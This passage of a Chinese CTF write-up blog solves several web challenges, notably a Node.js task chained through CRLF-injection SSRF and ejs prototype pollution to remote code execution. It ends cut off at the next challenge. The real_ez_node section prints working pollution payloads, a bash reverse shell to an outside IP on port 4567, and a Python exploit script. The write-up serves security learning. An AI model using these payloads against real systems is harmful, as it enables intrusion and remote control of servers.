class="line">od%09/F[B-O][@-B]G</span><br></pre></td></tr></table></figure><p>中括号没有被过滤和-没有被过滤，可以用正则表达式绕过</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207191631376.png" alt="image-20241207191631376"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dump = <span class="string">&quot;0000000 051516 041523 043124 031573 034465 032544 062463 026467 0000020 032064 030543 032055 034460 026465 033071 031063 031455 0000040 063144 060467 031146 032545 063145 076471 000012 0000055&quot;</span></span><br><span class="line">octs = [(<span class="string">&quot;0o&quot;</span> + n) <span class="keyword">for</span> n <span class="keyword">in</span> dump.split(<span class="string">&quot; &quot;</span>) <span class="keyword">if</span> n]</span><br><span class="line">hexs = [<span class="built_in">int</span>(n, <span class="number">8</span>) <span class="keyword">for</span> n <span class="keyword">in</span> octs]</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> hexs:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(<span class="built_in">hex</span>(n)) &gt; <span class="number">4</span>):</span><br><span class="line">        swapped = <span class="built_in">hex</span>(((n &lt;&lt; <span class="number">8</span>) | (n &gt;&gt; <span class="number">8</span>)) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">        result += swapped[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(result).decode())</span><br></pre></td></tr></table></figure><p>od获得的结果是八进制字符串，这里给出解码脚本</p><p>NSSCTF{359d53e7-44c1-4095-9632-3df7af2e5ef9}</p><h2 id="西湖论剑-2022-Node-Magical-Login"><a href="#西湖论剑-2022-Node-Magical-Login" class="headerlink" title="[西湖论剑 2022]Node Magical Login"></a>[西湖论剑 2022]Node Magical Login</h2><p>给了源码，这道题主要看源码就行</p><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">&quot;./controller&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="title class_">Number</span>(process.<span class="property">env</span>.<span class="property">PORT</span>) || <span class="number">80</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>:<span class="literal">false</span>&#125;))</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>())</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">LoginController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>,<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname,<span class="string">&quot;static/index.html&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag1&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">Flag1Controller</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag2&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckInternalController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>,<span class="variable constant_">HOST</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is listening on Host <span class="subst">$&#123;HOST&#125;</span> Port <span class="subst">$&#123;PORT&#125;</span>.`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>controller.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_COOKIE</span> = process.<span class="property">env</span>.<span class="property">SECRET_COOKIE</span> || <span class="string">&quot;this_is_testing_cookie&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag1 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> flag2 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LoginController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">        <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span> || password !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable constant_">SECRET_COOKIE</span>)</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckInternalController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;check.html&quot;</span>,&#123;<span class="attr">root</span>:<span class="string">&quot;static&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="title class_">LoginController</span>,</span><br><span class="line">    <span class="title class_">CheckInternalController</span>,</span><br><span class="line">    <span class="title class_">Flag1Controller</span>,</span><br><span class="line">    <span class="title class_">CheckController</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单，先看flag1，加一个cookie就行</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211091858315.png" alt="image-20241211091858315" style="zoom:80%;" /><p>重点是flag2，需要绕过toLowerCase()，传入一个json值，要求转小写后为aGr5AtSp55dRacer，可以通过json形式传入数组来绕过，老老实实传入字符串是不可能的。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211092027384.png" alt="image-20241211092027384"></p><p>简单。</p><h2 id="西湖论剑-2022-real-ez-node"><a href="#西湖论剑-2022-real-ez-node" class="headerlink" title="[西湖论剑 2022]real_ez_node"></a>[西湖论剑 2022]real_ez_node</h2><p>关键源码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> safeobj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">q</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get q&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// 任何 2xx 状态码都表示成功响应，但这里只检查 200。</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// 消费响应数据以释放内存</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>此处给出了各种版本，发现存在ejs模板引擎的JavaScript原型链污染。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211150618302.png" alt="image-20241211150618302" style="zoom:67%;" /><p>我们发现&#x2F;copy路由下会对<code>var ip = req.connection.remoteAddress;</code>ip值进行判断，需要为127.0.0.1，这不是通过XFF等就能改变的，我们继续往下审代码。发现&#x2F;curl路由处存在ssrf，那么我们是不是就能通过对&#x2F;curl路由的操作，让他以自己的身份去&#x2F;copy路由从而触发js原型链污染呢？！</p><p>&#x2F;curl路由下存在<code>http.get</code>方法，可以造成CRLF Injection</p><p>那么，我们只需要构造污染请求包，通过ejs模板引擎污染来实现RCE！！</p><p>完美了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype&quot;:&#123;&quot;constructor.prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;); __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194627392.png" alt="image-20241211194627392"></p><p>关键代码如上，过滤了<code>__proto__</code>同时说明了污染的存在。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194704771.png" alt="image-20241211194704771" style="zoom:80%;" /><p>同时，这里发现如果键名里面存在 <code>.</code> 才会继续调用 <code>_safe.expand</code>，相当于递归merge的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;__tmp1; global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\&quot;&#x27;); __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure><p>接下来构造CRLF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:3000</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 190</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0120&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\u010d\u010a&#x27;</span>).replace(<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\u017b&#x27;</span>).replace(</span><br><span class="line">    <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\u017d&#x27;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\u0122&#x27;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\u0127&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\u013e&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\u015c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = urllib.parse.quote(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28958/curl?q=&quot;</span></span><br><span class="line">requests.get(url+payload)</span><br></pre></td></tr></table></figure><p>当时在污染payload处卡了很久！！不知道为啥就是弹不了shell，这个可以弹！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure><p>主要思路就是在curl路由下通过CRLF攻击来构造恶意数据包来实现SSRF，用127.0.0.1去访问&#x2F;copy路由，造成ejs模板引擎的污染从而实现RCE！</p><h2 id="UUCTF-2022-新生赛-ezpop"><a href="#UUCTF-2022-新生赛-ezpop" class="headerlink" title="[UUCTF 2022 新生赛]ezpop"></a>[UUCTF 2022 新生赛]ezpop</h2><p>虽然是新生赛，但还可以。有点小综合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 